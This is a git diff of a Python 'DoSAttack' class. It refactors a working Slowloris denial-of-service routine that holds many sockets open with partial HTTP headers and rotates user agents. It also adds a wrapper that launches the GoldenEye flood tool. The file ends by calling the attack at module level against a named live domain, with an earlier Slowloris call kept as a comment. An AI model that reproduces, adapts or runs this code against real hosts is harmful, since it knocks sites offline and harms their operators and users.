@@ -1,12 +1,12 @@
 import torch
 import torch.nn as nn
 import socket
-import threading
 import random
 from random_string_generator import RandomStringGenerator
 import logging
 import subprocess
 from urllib.parse import urlparse
+import os
 
 
 logging.basicConfig(
@@ -15,38 +15,17 @@ logging.basicConfig(
 
 
 class DoSAttack:
-    def __init__(self, url, num_connections, attack_type="Slowloris", target_port=80):
-        self.url = url
-        self.target_port = target_port
-        self.num_connections = num_connections
+    def __init__(self):
         self.threads = []
-        self.model = RandomStringGenerator(100)
-        self.attack_type = attack_type
 
-    def simulate_attack(self):
-        for _ in range(self.num_connections):
-            if self.attack_type == "Slowloris":
-                self.slowloris_attack()
-            elif self.attack_type == "Slowhttptest":
-                thread = threading.Thread(target=self.slowhttptest_attack)
-            elif self.attack_type == "Hulk":
-                thread = threading.Thread(target=self.hulk_attack)
-            elif self.attack_type == "GoldenEye":
-                thread = threading.Thread(target=self.goldeneye_attack)
-            else:
-                thread = threading.Thread(target=self.create_connection)
-
-            self.threads.append(thread)
-            thread.start()
-
-    def create_connection(self):
+    def create_connection(self, url, target_port, model=RandomStringGenerator(100)):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            parsed_url = urlparse(self.url)
+            parsed_url = urlparse(url)
             hostname = parsed_url.netloc
             ip = socket.gethostbyname(hostname)
-            sock.connect((ip, self.target_port))
-            payload = self.model(torch.tensor([])).encode()  # Generate payload
+            sock.connect((ip, target_port))
+            payload = model(torch.tensor([])).encode()  # Generate payload
             sock.send(payload)
             logging.info(f"Payload sent: {payload}")
             sock.send(b"QUIT")
@@ -61,103 +40,22 @@ class DoSAttack:
     def send_header(self, s, name, value):
         self.send_line(s, f"{name}: {value}")
 
-    def slowloris_attack(self):
-        user_agents = [
-            (
-                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36"
-                " (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
-            ),
-            (
-                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36"
-                " (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"
-            ),
-            (
-                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50"
-                " (KHTML, like Gecko) Version/10.0 Safari/602.1.50"
-            ),
-            (
-                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101"
-                " Firefox/49.0"
-            ),
-            (
-                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36"
-                " (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
-            ),
-            (
-                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36"
-                " (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"
-            ),
-            (
-                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36"
-                " (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"
-            ),
-            (
-                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14"
-                " (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14"
-            ),
-            (
-                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50"
-                " (KHTML, like Gecko) Version/10.0 Safari/602.1.50"
-            ),
-            (
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,"
-                " like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
-            ),
-            (
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,"
-                " like Gecko) Chrome/53.0.2785.143 Safari/537.36"
-            ),
-            (
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,"
-                " like Gecko) Chrome/54.0.2840.71 Safari/537.36"
-            ),
-            (
-                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like"
-                " Gecko) Chrome/53.0.2785.143 Safari/537.36"
-            ),
-            (
-                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like"
-                " Gecko) Chrome/54.0.2840.71 Safari/537.36"
-            ),
-            "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
-            (
-                "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML,"
-                " like Gecko) Chrome/53.0.2785.143 Safari/537.36"
-            ),
-            (
-                "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML,"
-                " like Gecko) Chrome/54.0.2840.71 Safari/537.36"
-            ),
-            (
-                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like"
-                " Gecko) Chrome/53.0.2785.143 Safari/537.36"
-            ),
-            (
-                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like"
-                " Gecko) Chrome/54.0.2840.71 Safari/537.36"
-            ),
-            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
-            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-            "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
-            (
-                "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like"
-                " Gecko) Chrome/53.0.2785.143 Safari/537.36"
-            ),
-            (
-                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)"
-                " Chrome/53.0.2785.143 Safari/537.36"
-            ),
-            (
-                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101"
-                " Firefox/49.0"
-            ),
-        ]
+    def slowloris_attack(self, num_connections, url, target_port):
+        def read_user_agents(file_name):
+            user_agents = []
+            with open(file_name, "r") as file:
+                for line in file:
+                    user_agents.append(line.strip())
+            return user_agents
+
+        path = os.path.join(os.path.dirname(__file__), "useragents.txt")
+        user_agents = read_user_agents(path)
         list_of_sockets = []
 
         def init_socket(ip: str):
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(4)
-            s.connect((ip, self.target_port))
+            s.connect((ip, target_port))
             self.send_line(s, f"GET /?{random.randint(0, 2000)} HTTP/1.1")
             ua = random.choice(user_agents)
             self.send_header(s, "User-Agent", ua)
@@ -178,14 +76,14 @@ class DoSAttack:
             # Some of the sockets may have been closed due to errors or timeouts.
             # Re-create new sockets to replace them until we reach the desired number.
 
-            diff = self.num_connections - len(list_of_sockets)
+            diff = num_connections - len(list_of_sockets)
             if diff <= 0:
                 return
 
             logging.info("Creating %s new sockets...", diff)
             for _ in range(diff):
                 try:
-                    parsed_url = urlparse(self.url)
+                    parsed_url = urlparse(url)
                     hostname = parsed_url.netloc
                     s = init_socket(socket.gethostbyname(hostname))
                     if not s:
@@ -195,10 +93,10 @@ class DoSAttack:
                     logging.debug("Failed to create new socket: %s", e)
                     break
 
-        parsed_url = urlparse(self.url)
+        parsed_url = urlparse(url)
         hostname = parsed_url.netloc
         ip = socket.gethostbyname(hostname)
-        socket_count = self.num_connections
+        socket_count = num_connections
         logging.info("Attacking %s with %s sockets.", ip, socket_count)
         for _ in range(socket_count):
             try:
@@ -224,18 +122,38 @@ class DoSAttack:
     def hulk_attack(self):
         raise NotImplementedError
 
-    def goldeneye_attack(self):
-        logging.info("Attacking %s with GoldenEye...", self.url)
-        command = ["python3", "goldeneye.py", self.url, "-w", str(self.num_connections)]
+    def goldeneye_attack(
+        self,
+        url,
+        user_agents=os.path.join(os.path.dirname(__file__), "useragents.txt"),
+        workers=10,
+        sockets=500,
+        method="get",
+        nosslcheck=True,
+    ):
+        logging.info("Attacking %s with GoldenEye...", url)
+        path = os.path.join(os.path.dirname(__file__), "goldeneye.py")
+        command = [
+            "python3",
+            path,
+            url,
+            "-u",
+            str(user_agents),
+            "-w",
+            str(workers),
+            "-s",
+            str(sockets),
+            "-m",
+            method,
+            "-n",
+            str(nosslcheck),
+        ]
         subprocess.run(command)
 
-    def wait_for_threads(self):
-        for thread in self.threads:
-            thread.join()
 
+dos = DoSAttack()  # target_url, num_connections, attack_type
+# dos.simulate_attack()
 
-dos = DoSAttack(
-    "https://panthon.app", num_connections=100, attack_type="Slowloris", target_port=80
-)  # target_url, num_connections, attack_type
-dos.simulate_attack()
-dos.wait_for_threads()
+# dos.slowloris_attack(num_connections=100, url="https://panthon.app", target_port=80)
+
+dos.goldeneye_attack(url="https://panthon.app")
